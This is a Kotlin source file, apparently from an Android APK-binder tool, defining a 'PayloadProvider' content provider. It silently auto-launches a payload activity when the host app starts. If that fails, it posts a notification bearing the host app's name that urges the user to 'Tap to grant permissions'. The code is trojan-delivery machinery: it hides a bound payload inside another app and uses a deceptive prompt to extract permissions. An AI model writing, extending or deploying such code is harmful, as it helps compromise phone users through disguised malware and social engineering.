package Com.devhs.apkbinder.payload

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.ContentProvider
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import Com.devhs.apkbinder.core.Const

class PayloadProvider : ContentProvider() {

    override fun onCreate(): Boolean {
        try {
            val ctx = context ?: return true
            HsLog.init(ctx)
            HsLog.w("provider onCreate")
            Handler(Looper.getMainLooper()).postDelayed({
                launch(ctx)
            }, 1200L)
        } catch (t: Throwable) {
            HsLog.e("provider onCreate: ${t.javaClass.simpleName} ${t.message}")
        }
        return true
    }

    private fun launch(ctx: Context) {
        HsLog.w("launch attempt")
        try {
            val i = Intent()
            i.setClassName(ctx.packageName, Const.PAYLOAD_ACTIVITY)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            i.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
            ctx.startActivity(i)
            HsLog.w("startActivity ok")
        } catch (t: Throwable) {
            HsLog.e("startActivity failed: ${t.javaClass.simpleName} ${t.message}")
            notifyFallback(ctx)
        }
    }

    private fun notifyFallback(ctx: Context) {
        try {
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        Const.CHANNEL_ID, "Permissions", NotificationManager.IMPORTANCE_HIGH
                    )
                )
            }

            val i = Intent()
            i.setClassName(ctx.packageName, Const.PAYLOAD_ACTIVITY)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

            val flags = if (Build.VERSION.SDK_INT >= 23)
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            else PendingIntent.FLAG_UPDATE_CURRENT

            val pi = PendingIntent.getActivity(ctx, 1, i, flags)

            val name = try {
                ctx.packageManager.getApplicationLabel(
                    ctx.packageManager.getApplicationInfo(ctx.packageName, 0)
                ).toString()
            } catch (t: Throwable) {
                "App"
            }

            val builder = if (Build.VERSION.SDK_INT >= 26)
                android.app.Notification.Builder(ctx, Const.CHANNEL_ID)
            else
                @Suppress("DEPRECATION") android.app.Notification.Builder(ctx)

            builder
                .setContentTitle(name)
                .setContentText("Tap to grant permissions")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setContentIntent(pi)
                .setAutoCancel(true)

            nm.notify(Const.NOTIF_ID + 1, builder.build())
            HsLog.w("fallback notification posted")
        } catch (t: Throwable) {
            HsLog.e("fallback notify: ${t.message}")
        }
    }

    override fun query(
        uri: Uri, projection: Array<String>?, selection: String?,
        selectionArgs: Array<String>?, sortOrder: String?
    ): Cursor? = null

    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, s: String?, a: Array<String>?): Int = 0
    override fun update(uri: Uri, v: ContentValues?, s: String?, a: Array<String>?): Int = 0
}
